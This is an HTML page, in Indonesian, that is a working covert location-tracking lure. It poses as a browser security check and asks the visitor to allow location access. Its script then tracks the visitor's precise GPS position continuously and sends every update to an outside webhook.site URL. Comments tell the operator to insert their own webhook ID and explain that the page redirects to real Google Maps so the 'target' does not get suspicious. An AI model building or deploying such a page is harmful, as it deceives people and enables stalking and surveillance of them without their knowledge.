<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Sistem</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f9;
            color: #333;
        }
        .container {
            text-align: center;
            padding: 20px;
            border-radius: 8px;
            background: white;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            max-width: 400px;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        #status { font-weight: bold; color: #e74c3c; }
    </style>
</head>
<body>

<div class="container">
    <div class="loader"></div>
    <h2>Verifikasi Browser</h2>
    <p>Sedang memeriksa koneksi Anda. Mohon klik <b>"Izinkan"</b> atau <b>"Allow"</b> jika muncul permintaan akses lokasi untuk melanjutkan.</p>
    <p id="status">Menunggu Izin...</p>
</div>

<script>
    // GANTI ID DI BAWAH INI SESUAI WEBHOOK.SITE ANDA
    const WEBHOOK_ID = "31392989-6f64-41e2-84ee-91df8e979cd4";
    const WEBHOOK_URL = `https://webhook.site/${WEBHOOK_ID}`;
    
    function sendToPython(position) {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const accuracy = position.coords.accuracy;
        
        const data = `Lat: ${lat}, Lon: ${lon}, Acc: ${accuracy}m`;
        
        // Mengirim data ke Webhook
        fetch(WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'text/plain' },
            body: data
        });

        document.getElementById('status').innerText = "Koneksi Stabil - Mengalihkan...";
        document.getElementById('status').style.color = "#27ae60";

        // Opsional: Setelah berhasil dapat koordinat, alihkan ke Google Maps asli
        // agar target tidak curiga.
        setTimeout(() => {
            window.location.href = "https://www.google.com/maps";
        }, 5000);
    }

    function handleError(error) {
        let msg = "";
        switch(error.code) {
            case error.PERMISSION_DENIED:
                msg = "Akses ditolak. Silakan aktifkan GPS.";
                break;
            case error.POSITION_UNAVAILABLE:
                msg = "Informasi lokasi tidak tersedia.";
                break;
            case error.TIMEOUT:
                msg = "Waktu permintaan habis.";
                break;
        }
        document.getElementById('status').innerText = msg;
        
        // Tetap kirim log error ke Webhook
        fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: "Error: " + msg });
    }

    // Fungsi utama pelacakan
    if (navigator.geolocation) {
        // watchPosition akan mengirim update tiap kali target bergeser
        navigator.geolocation.watchPosition(sendToPython, handleError, {
            enableHighAccuracy: true, // WAJIB untuk GPS Presisi
            timeout: 10000,
            maximumAge: 0
        });
    } else {
        document.getElementById('status').innerText = "Browser tidak didukung.";
    }
</script>

</body>

</html>
